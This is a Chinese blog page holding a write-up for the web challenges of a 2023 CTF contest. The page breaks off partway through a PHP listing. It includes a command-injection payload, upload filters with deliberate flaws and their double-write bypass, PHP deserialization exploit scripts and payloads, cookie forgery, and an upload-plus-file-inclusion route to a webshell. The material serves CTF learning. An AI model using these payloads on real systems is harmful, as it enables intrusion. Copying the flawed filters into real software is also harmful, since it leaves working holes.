<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>PolarCTF网络安全2023冬季个人挑战赛 WEB方向题解 WriteUp - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="PolarCTF网络安全2023冬季个人挑战赛 WEB方向题解 WriteUp" />
<meta property="og:description" content="完工，最后CB链没时间打了，估计也不怎么打得出来，今天一边在打polar一边弄服务外包赛，好累呜呜呜。
Polar 冬 干正则（WEB） 直接给了源码
parse_str()：将字符串解析成多个变量
payload：
?id=a[]=www.polarctf.com&amp;cmd=;cat%20flag* Polar 冬 upload（WEB） 开题
源码里面发现hint
得到源码如下：
$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&#34;php&#34;,&#34;php5&#34;,&#34;php4&#34;,&#34;php3&#34;,&#34;php2&#34;,&#34;html&#34;,&#34;htm&#34;,&#34;phtml&#34;,&#34;pht&#34;,&#34;jsp&#34;,&#34;jspa&#34;,&#34;jspx&#34;,&#34;jsw&#34;,&#34;jsv&#34;,&#34;jspf&#34;,&#34;jtml&#34;,&#34;asp&#34;,&#34;aspx&#34;,&#34;asa&#34;,&#34;asax&#34;,&#34;ascx&#34;,&#34;ashx&#34;,&#34;asmx&#34;,&#34;cer&#34;,&#34;swf&#34;,&#34;htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&#34;&#34;, $file_name); $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.rand(10000,99999).$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } str_ireplace()：替换字符串中的一些字符（不区分大小写）。双写即可绕过。
直接getshell就行。
Polar 冬 cookie欺骗（WEB） 伪造一下Cookie就行" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/ad50d17e8cb2bdcefbb9dcbae067461e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-10T03:00:04+08:00" />
<meta property="article:modified_time" content="2023-12-10T03:00:04+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">PolarCTF网络安全2023冬季个人挑战赛 WEB方向题解 WriteUp</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>完工，最后CB链没时间打了，估计也不怎么打得出来，今天一边在打polar一边弄服务外包赛，好累呜呜呜。</p> 
<p><img src="https://images2.imgbox.com/2d/42/XCId6Fjm_o.png" alt="image-20231209211458693"></p> 
<h2><a id="Polar___WEB_4"></a>Polar 冬 干正则（WEB）</h2> 
<p>直接给了源码</p> 
<p><img src="https://images2.imgbox.com/10/35/Si0BdS2S_o.png" alt="image-20231209184906314"></p> 
<p><code>parse_str()</code>：将字符串解析成多个变量</p> 
<p>payload：</p> 
<pre><code>?id=a[]=www.polarctf.com&amp;cmd=;cat%20flag*
</code></pre> 
<p><img src="https://images2.imgbox.com/07/8f/aWpKQHRx_o.png" alt="image-20231209185752708"></p> 
<h2><a id="Polar___uploadWEB_22"></a>Polar 冬 upload（WEB）</h2> 
<p>开题</p> 
<p><img src="https://images2.imgbox.com/9d/56/5v5aHvXf_o.png" alt="image-20231209174903231"></p> 
<p>源码里面发现hint</p> 
<p><img src="https://images2.imgbox.com/81/73/2P9cdceU_o.png" alt="image-20231209175014438"></p> 
<p>得到源码如下：</p> 
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><code>str_ireplace()</code>：替换字符串中的一些字符（不区分大小写）。双写即可绕过。</p> 
<p><img src="https://images2.imgbox.com/c8/fb/e2IULBx3_o.png" alt="image-20231209175845103"></p> 
<p>直接getshell就行。</p> 
<p><img src="https://images2.imgbox.com/64/9b/1cHbDciH_o.png" alt="image-20231209175907314"></p> 
<h2><a id="Polar___cookieWEB_68"></a>Polar 冬 cookie欺骗（WEB）</h2> 
<p>伪造一下Cookie就行</p> 
<p><img src="https://images2.imgbox.com/38/bb/7uCwLBfS_o.png" alt="image-20231209174732680"></p> 
<h2><a id="Polar___WEB_82"></a>Polar 冬 随机值（WEB）</h2> 
<p>直接给了源码</p> 
<p><img src="https://images2.imgbox.com/a7/31/UffRi8Fy_o.png" alt="image-20231209142904368"></p> 
<p>要满足两个随机值，可以暴力爆破，发包10000次应该够了。我们按题目预期来，使用变量引用来做这题。</p> 
<p>PHP7，类型不敏感，类中属性可以全换为public。</p> 
<p><img src="https://images2.imgbox.com/99/6a/HixjMbJO_o.png" alt="image-20231209143127572"></p> 
<p>秒了。</p> 
<p>EXP：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$Polar1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Polar2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Night</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Light</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$Polar2</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Polar1</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Polar2</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$Light</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Night</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Light</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your wrong!!!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">Polar1</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">Polar2</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">Night</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">Light</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/90/f4/bQSmVr6t_o.png" alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传"></p> 
<h2><a id="Polar___WEB_131"></a>Polar 冬 你想逃也逃不掉（WEB）</h2> 
<p>直接给了源码</p> 
<p><img src="https://images2.imgbox.com/15/1b/I85ynTdl_o.png" alt="image-20231209143715123"></p> 
<p>反序列化之字符串逃逸。</p> 
<p>EXP：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/phtml|php3|php4|php5|aspx|gif/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phtmlphtmlphtmlphtml'</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">';s:6:"passwd";s:0:"";s:4:"sign";s:6:"ytyyds";}'</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">;</span>
<span class="token comment">#a:3:{s:8:"username";s:5:"Jay17";s:6:"passwd";s:0:"";s:4:"sign";s:6:"123456";}</span>


<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤字符后</span>


<span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token punctuation">)</span><span class="token punctuation">[</span>sign<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"ytyyds"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\nJay17"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/fd/37/rhqo2wpL_o.png" alt="image-20231209153321155"></p> 
<p>payload：</p> 
<pre><code>GET：?passwd=%3Bs%3A6%3A%22passwd%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22sign%22%3Bs%3A6%3A%22ytyyds%22%3B%7D

POST：name=phtmlphtmlphtmlphtml
</code></pre> 
<p><img src="https://images2.imgbox.com/b1/1f/x2mbalnd_o.png" alt="image-20231209153438639"></p> 
<h2><a id="Polar___ezphpWEB_181"></a>Polar 冬 ezphp（WEB）</h2> 
<p>开题，爬虫相关，想到<code>robots.txt</code>文件</p> 
<p><img src="https://images2.imgbox.com/63/fa/qKcAuDXL_o.png" alt="image-20231209153811840"></p> 
<p>访问<code>robots.txt</code>，获得三个路由</p> 
<p><img src="https://images2.imgbox.com/69/f3/Nhkn9D0w_o.png" alt="image-20231209153904554"></p> 
<p><code>/uploads/upload.php</code>：文件上传功能</p> 
<p><code>/file/file.php</code>：文件包含功能</p> 
<p>文件包含读取<code>upload.php</code>文件内容：</p> 
<pre><code class="prism language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string double-quoted-string">"en"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width, initial-scale=1.0"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>File Upload<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// 检查文件是否上传成功</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// 定义允许上传的文件类型</span>
        <span class="token variable">$allowed_extensions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 获取上传文件的文件名和扩展名</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$file_extension</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 检查文件扩展名是否在允许的列表中</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_extension</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$allowed_extensions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// 确定存储上传文件的目录</span>
            <span class="token variable">$upload_directory</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./images/'</span><span class="token punctuation">;</span>

            <span class="token comment">// 确保目录存在，如果不存在则创建</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$upload_directory</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$upload_directory</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// 构造上传文件的完整路径</span>
            <span class="token variable">$upload_path</span> <span class="token operator">=</span> <span class="token variable">$upload_directory</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

            <span class="token comment">// 移动文件到指定目录</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$upload_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p&gt;文件上传成功！&lt;/p&gt;'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p&gt;文件上传失败。&lt;/p&gt;'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p&gt;不允许上传该类型的文件。&lt;/p&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;p&gt;文件上传失败。&lt;/p&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">""</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"post"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token operator">&gt;</span>选择文件：<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> accept<span class="token operator">=</span><span class="token string double-quoted-string">".jpg, .jpeg, .png, .gif"</span> required<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"上传文件"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
</code></pre> 
<p>文件后缀是白名单，难绕过，一般白名单的文件上传都是要结合其他漏洞。有文件包含，那就结合文件包含。</p> 
<p>有文件包含，所以后缀不用管，包含文件内容，就算jpg都能把马包含进来。</p> 
<p>直接包含</p> 
<p><img src="https://images2.imgbox.com/ec/72/Exmcq6YZ_o.png" alt="image-20231209195509309"></p> 
<p>看源码，目录是，<code>/uploads/images/xxx.xxx</code>。</p> 
<p><code>/file/file.php</code> 文件包含getshell。</p> 
<p><img src="https://images2.imgbox.com/2a/e0/5zbeKJzi_o.png" alt="image-20231209195904527"></p> 
<h2><a id="Polar___WEB_273"></a>Polar 冬 你的马呢？（WEB）</h2> 
<p>开题：（注意URL，可能会存在文件包含）</p> 
<p><img src="https://images2.imgbox.com/ed/e0/i9sLd0PU_o.png" alt="image-20231209131707043"></p> 
<p>还真存在文件包含</p> 
<p><img src="https://images2.imgbox.com/38/50/R7ZQcdHJ_o.png" alt="image-20231209131744373"></p> 
<p>upload.php</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token variable">$uploaddir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uploads/'</span><span class="token punctuation">;</span>
		<span class="token variable">$uploadfile</span> <span class="token operator">=</span> <span class="token variable">$uploaddir</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">//检查文件内容</span>
		<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


		<span class="token keyword">echo</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>

		<span class="token comment">//检查文件后缀</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph.|htaccess/i"</span><span class="token punctuation">,</span> <span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>

			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?php/i"</span><span class="token punctuation">,</span> <span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
				<span class="token keyword">echo</span> <span class="token string double-quoted-string">"嘿嘿嘿，想传马？不可能！&lt;br&gt;"</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
